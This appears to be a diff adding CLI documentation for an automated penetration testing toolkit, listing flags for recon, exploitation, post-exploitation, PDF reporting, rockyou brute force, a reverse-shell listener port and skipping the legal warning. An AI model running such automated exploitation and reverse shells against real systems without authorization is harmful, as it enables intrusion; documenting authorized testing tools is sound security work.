@@ -1,0 +1,64 @@
+### Complete Walkthrough ###
+
+- **Command:** `--walkthrough`
+- **Objective:** To run the entire penetration testing workflow from start to finish. This includes reconnaissance, exploitation, post-exploitation, and final report generation.
+- **Requires:** `--target`, `--attacker-ip`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --walkthrough`
+
+---
+
+### Individual Phase Commands ###
+
+- **Command:** `--recon`
+- **Objective:** To run ONLY the reconnaissance phase. This will scan the target and save the results, but will not attempt any exploits.
+- **Requires:** `--target`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --recon`
+
+- **Command:** `--exploit`
+- **Objective:** To run ONLY the exploitation phase. This requires that the reconnaissance phase has already been completed for the target, as it uses the recon results to launch attacks.
+- **Requires:** `--target`, `--attacker-ip`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --exploit`
+
+- **Command:** `--post-exploit`
+- **Objective:** To run ONLY the post-exploitation phase. This requires that the exploitation phase has already been completed and was successful.
+- **Requires:** `--target`, `--attacker-ip`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --post-exploit`
+
+- **Command:** `--report`
+- **Objective:** To generate the final comprehensive PDF report using all the data gathered from the previous phases.
+- **Requires:** `--target`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --report`
+
+- **Command:** `--generate-walkthrough`
+- **Objective:** To generate the final PDF walkthrough, which details the steps taken to compromise the target.
+- **Requires:** `--target`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --generate-walkthrough`
+
+---
+
+### Command Modifiers and Options ###
+
+- **Option:** `--services <service1,service2,...>`
+- **Objective:** To limit any phase (recon, exploit, etc.) to only the specified services.
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --walkthrough --services http,ftp`
+
+- **Option:** `--use-rockyou`
+- **Objective:** To enable the use of the `rockyou.txt` wordlist during brute-force attacks (e.g., with Hydra).
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --exploit --use-rockyou`
+
+- **Option:** `--attacker-port <port>`
+- **Objective:** To specify the listening port on the attacker's machine for reverse shells.
+- **Default:** `4444`
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --attacker-ip 192.168.1.16 --exploit --attacker-port 9001`
+
+---
+
+### Utility Commands ###
+
+- **Command:** `--list-services`
+- **Objective:** To display a list of all the services that the toolkit has modules for and can test.
+- **Example:** `python3 -m cli.main --list-services`
+
+- **Command:** `--no-confirm`
+- **Objective:** To skip all interactive prompts, such as the legal warning. This is useful for running the toolkit in fully automated scripts.
+- **Example:** `python3 -m cli.main --target 192.168.1.10 --recon --no-confirm`
